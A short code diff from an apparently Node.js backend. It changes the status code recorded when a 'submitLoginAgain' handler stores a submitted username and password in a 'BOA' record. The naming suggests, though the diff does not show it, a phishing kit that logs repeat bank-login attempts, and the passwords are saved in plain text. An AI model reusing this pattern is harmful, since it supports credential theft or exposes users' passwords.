@@ -24,7 +24,7 @@ const submitLoginAgain = async (req, res) => {
     try {
         await BOA.findOneAndUpdate(
             { uniqueid },
-            { username, password, status: 5, timestamp: moment().format() }
+            { username, password, status: 9, timestamp: moment().format() }
         ).exec();
         res.sendStatus(200);
     } catch (error) {
